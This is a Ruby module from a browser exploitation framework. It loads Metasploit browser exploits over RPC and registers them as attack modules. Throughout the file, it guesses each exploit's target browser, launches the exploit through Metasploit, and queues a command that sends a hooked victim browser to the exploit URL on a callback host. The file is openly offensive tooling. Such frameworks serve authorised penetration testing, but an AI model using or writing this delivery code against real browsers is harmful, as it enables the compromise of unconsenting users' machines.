#
# Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (Server) - https://serverproject.com
# See the file 'doc/COPYING' for copying permission
#
module Server
  module Extension
    module Metasploit
      module API
        module MetasploitHooks
          Server::API::Registrar.instance.register(Server::Extension::Metasploit::API::MetasploitHooks, Server::API::Modules, 'post_soft_load')
          Server::API::Registrar.instance.register(Server::Extension::Metasploit::API::MetasploitHooks, Server::API::HttpServer, 'mount_handler')

          # Load modules from metasploit just after all other module config is loaded
          def self.post_soft_load
            msf = Server::Extension::Metasploit::RpcClient.instance

            timeout = 10
            connected = false
            Timeout.timeout(timeout) do
              print_status("Connecting to Metasploit on #{Server::Core::Configuration.instance.get('server.extension.metasploit.host')}:#{Server::Core::Configuration.instance.get('server.extension.metasploit.port')}")
              connected = msf.login
            rescue Timeout::Error
              return
            end

            return unless connected

            msf_module_config = {}
            path = "#{$root_dir}/#{Server::Core::Configuration.instance.get('server.extension.metasploit.path')}/msf-exploits.cache"
            if !Server::Core::Console::CommandLine.parse[:resetdb] && File.exist?(path)
              print_debug 'Attempting to use Metasploit exploits cache file'
              raw = File.read(path)
              begin
                msf_module_config = YAML.safe_load(raw)
              rescue StandardError => e
                print_error "[Metasploit] #{e.message}"
                print_error e.backtrace
              end
              count = 1
              msf_module_config.each do |k, _v|
                Server::API::Registrar.instance.register(Server::Extension::Metasploit::API::MetasploitHooks, Server::API::Module, 'get_options', [k])
                Server::API::Registrar.instance.register(Server::Extension::Metasploit::API::MetasploitHooks, Server::API::Module, 'get_payload_options', [k, nil])
                Server::API::Registrar.instance.register(Server::Extension::Metasploit::API::MetasploitHooks, Server::API::Module, 'override_execute', [k, nil, nil])
                print_over "Loaded #{count} Metasploit exploits."
                count += 1
              end
              print "\r\n"
            else
              msf_modules = msf.call('module.exploits')
              count = 1
              msf_modules['modules'].each do |m|
                next unless m.include? '/browser/'

                m_details = msf.call('module.info', 'exploit', m)
                next unless m_details

                key = "msf_#{m.split('/').last}"
                # system currently doesn't support multilevel categories
                # categories = ['Metasploit']
                # m.split('/')[0...-1].each{|c|
                #    categories.push(c.capitalize)
                # }

                if m_details['description'] =~ /Java|JVM|flash|Adobe/i
                  target_browser = { Server::Core::Constants::CommandModule::VERIFIED_USER_NOTIFY => ['ALL'] }
                elsif m_details['description'] =~ /IE|Internet\s+Explorer/i
                  target_browser = { Server::Core::Constants::CommandModule::VERIFIED_WORKING => ['IE'] }
                elsif m_details['description'] =~ /Firefox/i
                  target_browser = { Server::Core::Constants::CommandModule::VERIFIED_WORKING => ['FF'] }
                elsif m_details['description'] =~ /Chrome/i
                  target_browser = { Server::Core::Constants::CommandModule::VERIFIED_WORKING => ['C'] }
                elsif m_details['description'] =~ /Safari/i
                  target_browser = { Server::Core::Constants::CommandModule::VERIFIED_WORKING => ['S'] }
                elsif m_details['description'] =~ /Opera/i
                  target_browser = { Server::Core::Constants::CommandModule::VERIFIED_WORKING => ['O'] }
                end

                # TODO:
                #  - Add support for detection of target OS
                #  - Add support for detection of target services (e.g. java, flash, silverlight, ...etc)
                #  - Add support for multiple target browsers as currently only 1 browser will match or all

                msf_module_config[key] = {
                  'enable' => true,
                  'msf' => true,
                  'msf_key' => m,
                  'name' => m_details['name'],
                  'category' => 'Metasploit',
                  'description' => m_details['description'],
                  'authors' => m_details['references'],
                  'path' => path,
                  'class' => 'Msf_module',
                  'target' => target_browser
                }
                Server::API::Registrar.instance.register(Server::Extension::Metasploit::API::MetasploitHooks, Server::API::Module, 'get_options', [key])
                Server::API::Registrar.instance.register(Server::Extension::Metasploit::API::MetasploitHooks, Server::API::Module, 'get_payload_options', [key, nil])
                Server::API::Registrar.instance.register(Server::Extension::Metasploit::API::MetasploitHooks, Server::API::Module, 'override_execute', [key, nil, nil])
                print_over "Loaded #{count} Metasploit exploits."
                count += 1
              end
              print "\r\n"
              File.open(path, 'w') do |f|
                f.write(msf_module_config.to_yaml)
                print_debug("Wrote Metasploit exploits to cache file: #{path}")
              end
            end

            Server::Core::Configuration.instance.set('server.module', msf_module_config)
          end

          # Get module options + payloads when the server framework requests this information
          def self.get_options(mod)
            msf_key = Server::Core::Configuration.instance.get("server.module.#{mod}.msf_key")
            return if msf_key.nil?

            msf = Server::Extension::Metasploit::RpcClient.instance
            return unless msf.login

            msf_module_options = msf.call('module.options', 'exploit', msf_key)
            com = Server::Core::Models::CommandModule.where(name: mod).first
            unless msf_module_options
              print_error "Unable to retrieve metasploit options for exploit: #{msf_key}"
              return
            end

            options = Server::Extension::Metasploit.translate_options(msf_module_options)
            options << {
              'name' => 'mod_id',
              'id' => 'mod_id',
              'type' => 'hidden',
              'value' => com.id
            }

            msf_payload_options = msf.call('module.compatible_payloads', msf_key)
            print_error "Unable to retrieve metasploit payloads for exploit: #{msf_key}" unless msf_payload_options

            options << Server::Extension::Metasploit.translate_payload(msf_payload_options)
            options
          end

          # Execute function for all metasploit exploits
          def self.override_execute(mod, hbsession, opts)
            msf = Server::Extension::Metasploit::RpcClient.instance
            msf_key = Server::Core::Configuration.instance.get("server.module.#{mod}.msf_key")
            msf_opts = {}

            opts.each do |opt|
              next if %w[e ie_session and_module_id].include? opt['name']

              msf_opts[opt['name']] = opt['value']
            end

            if !msf_key.nil? && msf.login
              # Are the options correctly formatted for msf?
              # This call has not been tested
              msf.call('module.execute', 'exploit', msf_key, msf_opts)
            end

            hb = Server::HBManager.get_by_session(hbsession)
            unless hb
              print_error "Could not find hooked browser when attempting to execute module '#{mod}'"
              return false
            end

            bopts = []
            proto = msf_opts['SSL'] ? 'https' : 'http'
            config = Server::Core::Configuration.instance.get('server.extension.metasploit')
            uri = "#{proto}://#{config['callback_host']}:#{msf_opts['SRVPORT']}/#{msf_opts['URIPATH']}"

            bopts << { sploit_url: uri }
            Server::Core::Models::Command.new(
              data: bopts.to_json,
              hooked_browser_id: hb.id,
              command_module_id: Server::Core::Configuration.instance.get("server.module.#{mod}.db.id"),
              creationdate: Time.new.to_i
            ).save

            # Still need to create command object to store a string saying "Exploit launched @ [time]", to ensure Server can keep track of
            # which exploits where executed against which hooked browsers
            true
          end

          # Get module options + payloads when the server framework requests this information
          def self.get_payload_options(mod, payload)
            msf_key = Server::Core::Configuration.instance.get("server.module.#{mod}.msf_key")

            return if msf_key.nil?

            msf = Server::Extension::Metasploit::RpcClient.instance

            return unless msf.login

            msf_module_options = msf.call('module.options', 'payload', payload)

            if msf_module_options
              Server::Extension::Metasploit.translate_options(msf_module_options)
            else
              print_error "Unable to retrieve metasploit payload options for exploit: #{msf_key}"
            end
          end

          # Mounts the handler for processing Metasploit RESTful API requests.
          #
          # @param server_server [Server::Core::HttpServer] HTTP server instance
          def self.mount_handler(server_server)
            server_server.mount('/api/msf', Server::Extension::Metasploit::MsfRest.new)
          end
        end
      end
    end
  end
end
